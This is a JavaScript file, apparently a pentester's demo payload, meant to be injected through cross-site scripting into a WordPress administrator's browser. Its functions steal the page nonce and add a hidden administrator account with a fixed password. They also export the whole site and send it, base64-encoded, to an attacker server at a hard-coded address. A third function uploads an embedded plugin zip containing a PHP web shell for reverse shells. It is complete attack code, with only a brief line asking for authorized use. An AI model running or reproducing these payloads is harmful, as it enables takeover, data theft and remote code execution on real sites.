/*
	JavaScript functions designed to be used as a XSS payload
	against a WordPress admin. 

	Built for an XSS to shell demo/talk. 

	Inject a script include for this file. 

	Only use this code for pentesting systems you're authorized to 
	touch. Or I will be seriously grumpy in your general direction. 


	@hoodoer

	https://github.com/hoodoer
*/




// Web server listening for exfil data
// This will be as base64 data with a .js added, trying to 
// include a non-exist remote javascript file so you 
// get the base64 data in the 404 log
var httpExfilServer = "http://192.168.78.135:8888"


function read_body(xhr) { 
	var data;

	if (!xhr.responseType || xhr.responseType === "text") 
	{
		data = xhr.responseText;
	} 
	else if (xhr.responseType === "document") 
	{
		data = xhr.responseXML;
	} 
	else if (xhr.responseType === "json") 
	{
		data = xhr.responseJSON;
	} 
	else 
	{
		data = xhr.response;
	}
	return data; 
}





function sendAddUserPost(nonce)
{
	// The following user will be added as an Administrator level user
	var username  = "ishouldntbehere";
	var email     = "advancedadmin%40bad.af"
	var firstName = "trevor";
	var lastName  = "roach";
	var password  = "toor";

	var uri       = "/wp-admin/user-new.php";

	xhr = new XMLHttpRequest();
	xhr.open("POST", uri);

 	xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
 	xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

	var body = "action=createuser&"
	body += "_wpnonce_create-user=" + nonce + "&"; 
	body += "_wp_http_referer=%2Fwp-admin%2Fuser-new.php&"
	body += "user_login=" + username + "&";
	body += "email=" + email + "&";
	body += "first_name=" + firstName + "&";
	body += "last_name=" + lastName + "&";
	body += "uri=&";
	body += "pass1=" + password + "&";
	body += "pass1-text=" + password + "&";
	body += "pass2=" + password + "&";
	body += "pw_weak=on&";
	body += "send_user_notification=0&";
	body += "role=subscriber&";
	body += "ure_select_other_roles=administrator&"; // muahahahaha 
	body += "ure_other_roles=administrator&"; // insert Dr. Evil second muahahahaha
	body += "createuser=Add+New+User";

	xhr.send(body);
}


// Parse out the nonce value then pass to the add user function
function getNonceAndAddUser()
{
	// console.log("Starting getNonce...");
	var uri = "/wp-admin/user-new.php";

	xhr = new XMLHttpRequest();

	xhr.open("GET", uri, true);
	xhr.send(null);


	xhr.onreadystatechange = function()
	{
		if (xhr.readyState == XMLHttpRequest.DONE)
		{
			var response = read_body(xhr);
			var noncePos = response.indexOf('name="_wpnonce_create-user" value="');
		//	console.log("Nonce position: " + noncePos);

			var nonceVal = response.substring(noncePos+35, noncePos+45);
			sendAddUserPost(nonceVal);
		}
	}
}



// Exports the content of the wordpress site, incase you want to clone it
// Exfils the base64 encoded content as as script include, e.g. [base64 data].js
// because we can't just GET parameter it out due to CORS in wordpress
function exportWordPressSite()
{
	var uri = "/wp-admin/export.php?download=true&content=all&cat=0&post_author=0&post_start_date=0&post_end_date=0&post_status=0&page_author=0&page_start_date=0&page_end_date=0&page_status=0&attachment_start_date=0&attachment_end_date=0&submit=Download+Export+File";
	
	xhr = new XMLHttpRequest();
	
	xhr.open("GET", uri, true);
	xhr.send(null);

	xhr.onreadystatechange = function()
	{
		if (xhr.readyState == XMLHttpRequest.DONE)
		{
			var response = read_body(xhr);

			// This will fail since the script doesn't exist, but you'll
			// get the base64 data on the 404 log on the server. 
			// You can't just do an XHR request
			// off to the external server due to the CORS policy
			var script = document.createElement("script");
			script.src = httpExfilServer + "/script/" + btoa(response) + ".js";
			document.head.appendChild(script);  
		}
	}
}



// Get the nonce required for adding a new plugin
// and upload the malicious plugin. Then you can use
// the yertle.py script to execute actions such
// as starting a reverse shell, or popping a php
// meterpreter shell
function installYertleShell()
{
	console.log("Starting add plugin, hunting for the nonce...");

		// console.log("Starting getNonce...");
	var uri = "/wp-admin/plugin-install.php";

	xhr = new XMLHttpRequest();

	xhr.open("GET", uri, true);
	xhr.send(null);


	xhr.onreadystatechange = function()
	{
		if (xhr.readyState == XMLHttpRequest.DONE)
		{
			var response = read_body(xhr);
			var noncePos = response.indexOf('name="_wpnonce" value="');
			console.log("Nonce position: " + noncePos);

			var nonceVal = response.substring(noncePos+23, noncePos+33);
			console.log("Nonce substring: " + nonceVal);

			// Now we have the nonce, we need to add the plugin....


			// This data buffer should be your 
			// PHP plugin zip file. 
			// You shouldn't use mine. Don't trust
			// rando binaries on github. Replace this
			// with your own. I didn't put anything
			// extra malicious in there, but why 
			// should you trust me? Plot spoiler, you shouldn't.

			// Created a script to convert files
			// into the javascript buffer format,
			// you can use this on your wordpress plugin.zip file
			// to encode it for embedding here:
			// https://github.com/hoodoer/javascriptFileEncoder

			var pluginZipFile = '\x50\x4b\x03\x04\x14\x00\x08\x00\x08\x00\x04\x4f' +
			'\x78\x4a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' +
			'\x00\x00\x09\x00\x10\x00\x73\x68\x65\x6c\x6c\x2e' +
			'\x70\x68\x70\x55\x58\x0c\x00\xa3\x41\xd5\x58\x97' +
			'\x41\xd5\x58\xf5\x01\x14\x00\x95\x51\x6d\x6b\xdb' +
			'\x30\x10\xfe\xee\x5f\x71\x94\x40\x92\x92\xc4\x09' +
			'\x8c\x7d\x48\xdb\x8d\xb1\xf5\x25\x5f\x46\xe8\xcb' +
			'\x4a\x29\xc5\xc8\xd2\x39\xd6\x2a\x4b\x46\x27\x27' +
			'\xcd\x4a\xff\x7b\x25\x7b\x71\x3d\x96\x32\x26\x04' +
			'\x92\xee\x9e\x7b\x9e\xe7\x4e\xc7\x9f\xcb\xbc\x8c' +
			'\xc0\xaf\xf8\xb0\x3e\x96\xaa\x5a\x49\x0d\xdf\x59' +
			'\x81\x73\xb8\x43\xeb\x14\xc2\x42\x3b\xb4\x8c\x3b' +
			'\xb9\x46\xb8\xca\x51\xa9\x2e\xf2\xe6\x72\x31\x87' +
			'\xdc\xb9\x92\xe6\x71\xbc\x92\x2e\xaf\xd2\x09\x37' +
			'\x45\xac\xa7\xd3\x72\x5b\x03\xbf\x21\x71\x2b\x4b' +
			'\x27\x8d\x9e\xc3\x75\x2e\x09\xfc\x66\x90\x32\xfe' +
			'\x28\x8c\xb1\xb0\xbc\x58\x02\x05\x5a\x10\x48\x72' +
			'\xa5\x51\x80\x33\x90\x22\x54\xe4\xaf\x1b\x4f\x09' +
			'\x2e\xc7\x9d\x99\x86\x0b\x32\x6b\x0a\xb8\x5d\x9e' +
			'\x19\xcb\x71\x52\xcb\xfc\x40\x4b\xb5\xc4\x74\x32' +
			'\xab\x03\x5f\x2a\x97\x7b\xfa\x7f\x1b\x3c\x8c\xa3' +
			'\x28\x8e\xe1\xab\x29\xa5\x17\x64\x5a\x40\x61\x84' +
			'\xcc\xc2\xa3\x96\xd9\x53\xac\xd0\xe8\x9f\xbf\x58' +
			'\xbc\x31\x56\x94\x16\x89\xc6\x75\x07\x51\xcf\x27' +
			'\x8b\xc0\x70\x02\xbd\xe4\xfc\xf4\xfa\xfe\x80\x17' +
			'\xe2\xe0\xe1\xa8\x9b\xa0\x2a\x25\x67\x07\xbb\xc8' +
			'\x08\xa6\x23\x18\xcf\x86\x7f\x60\x52\x46\xf8\xf1' +
			'\x43\x22\x90\x1b\x81\x2d\xd4\x63\x22\x99\xc1\x80' +
			'\x2b\x46\x94\xe0\x93\x24\x47\x83\xfe\x25\x66\x0a' +
			'\x79\x18\xef\x59\xa5\xeb\xb3\x3f\x1c\xc2\x73\x68' +
			'\xad\x97\xfd\x8e\x78\x4a\x8d\x1b\xf8\x1b\x3a\xe8' +
			'\xd3\x96\x1c\x16\x7d\xcf\x1d\x0a\x5c\x2e\xf5\x6a' +
			'\x1b\xec\xef\x4a\xc7\x9f\xa4\x5e\x9b\xc7\x37\x17' +
			'\x10\x6c\xbc\x00\x2a\xc2\x60\x66\x87\x6b\xfd\x70' +
			'\xa6\x54\xe2\xff\xce\x26\x21\x95\x30\x6b\xd9\xb6' +
			'\x75\xb4\x2f\xd9\x7a\x18\x41\xf3\x6e\xfb\xfd\x2f' +
			'\xa5\x77\x34\x3a\xec\xdd\x39\x36\xb4\x4d\x41\x03' +
			'\xe8\x8e\xf9\x25\x7a\x05\x50\x4b\x07\x08\xb6\x4d' +
			'\xf5\xf4\x8b\x01\x00\x00\x1a\x03\x00\x00\x50\x4b' +
			'\x01\x02\x15\x03\x14\x00\x08\x00\x08\x00\x04\x4f' +
			'\x78\x4a\xb6\x4d\xf5\xf4\x8b\x01\x00\x00\x1a\x03' +
			'\x00\x00\x09\x00\x0c\x00\x00\x00\x00\x00\x00\x00' +
			'\x00\x40\xa4\x81\x00\x00\x00\x00\x73\x68\x65\x6c' +
			'\x6c\x2e\x70\x68\x70\x55\x58\x08\x00\xa3\x41\xd5' +
			'\x58\x97\x41\xd5\x58\x50\x4b\x05\x06\x00\x00\x00' +
			'\x00\x01\x00\x01\x00\x43\x00\x00\x00\xd2\x01\x00' +
			'\x00\x00\x00';


			var fileSize = pluginZipFile.length;

			var boundary = "---------------------------82520842616842250352141452311";

			var uploadURI = "/wp-admin/update.php?action=upload-plugin";

			uploadXhr = new XMLHttpRequest();
			uploadXhr.open("POST", uploadURI, true);

			uploadXhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=" + boundary);
			uploadXhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
			uploadXhr.setRequestHeader("Upgrade-Insecure-Requests", "1");

			var body = "--" + boundary + "\r\n";
			body += 'Content-Disposition: form-data; name="_wpnonce"' + '\r\n\r\n';
			body += nonceVal + "\r\n"; 

			body += "--" + boundary + "\r\n";
			body += 'Content-Disposition: form-data; name="_wp_http_referer"' + "\r\n\r\n";
			body += "/wp-admin/plugin-install.php" + "\r\n";


			body += "--" + boundary + "\r\n";
			body += 'Content-Disposition: form-data; name="pluginzip"; filename="shell.zip"' + "\r\n";
			body += "Content-Type: application/zip" + "\r\n\r\n";
			body += pluginZipFile + "\r\n";

			body += "--" + boundary + "\r\n";
			body += 'Content-Disposition: form-data; name="install-plugin-submit"' + "\r\n\r\n";
			body += "Install Now" + "\r\n";
			body += "--" + boundary + "--\r\n\r\n";

			var aBody = new Uint8Array(body.length);
			for (var i = 0; i < aBody.length; i++)
			{
				aBody[i] = body.charCodeAt(i);
			}
			uploadXhr.send(new Blob([aBody]));

			console.log("Done adding malicious plugin");
			// This is fun, you don't actually have to activate the yertle plugin
			// to use it. 
			// You can now use the yertle script to interact with the server by 
			// sending php code, assuming that's the plugin you added. That's
			// what's in the zip file embedded in this javascript example
			// See WPForce:
			// https://github.com/n00py/WPForce
			// Note that I had a misspelling in here before. Thankfully
			// Scott White noticed it, and informed me of my error. 
			// Not through a pull request, no. Shit-posting, yes. 
			// God bless that fella. 

		}
	}
}






/*
	Calling functions

	Pick what you want to run when the XSS is executed by uncommenting
	Some functions require tweaking of variables to achice the desired 
	outcome. 
*/

// Uncomment the function you want to run on the XSS pop
//getNonceAndAddUser();
//exportWordPressSite();
//installYertleShell();

